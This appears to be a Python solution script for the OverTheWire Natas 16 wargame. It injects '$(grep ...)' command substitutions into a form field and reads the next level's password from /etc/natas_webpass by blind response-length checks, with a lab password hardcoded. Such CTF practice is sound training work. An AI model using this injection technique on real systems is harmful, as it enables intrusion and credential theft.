import requests
import string

characters = string.digits + string.ascii_letters
URL = "http://natas16.natas.labs.overthewire.org/"
NATAS16PASSWD = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V" # Cambiar esto
natas17passwd_characters = ""
natas17passwd = ""

s = requests.Session()
s.auth = ("natas16", NATAS16PASSWD)

print("[+] La contraseña contiene esto caracteres: ", end="")
for i in characters:
    injection = f"$(grep {i} /etc/natas_webpass/natas17)"
    data = {"needle": injection, "submit": "true"}
    r = s.post(URL, data=data)
    if len(r.content) == 1105:
        natas17passwd_characters += i
        print(i, end="", flush=True)

print("\n[!] La contraseña para natas17 es: ", end="")
for _ in range(32):
    for i in natas17passwd_characters:
        injection = f"$(grep ^{natas17passwd + i} /etc/natas_webpass/natas17)"
        data = {"needle": injection, "submit": "true"}
        r = s.post(URL, data=data)
        if len(r.content) == 1105:
            natas17passwd += i
            print(i, end="", flush=True)

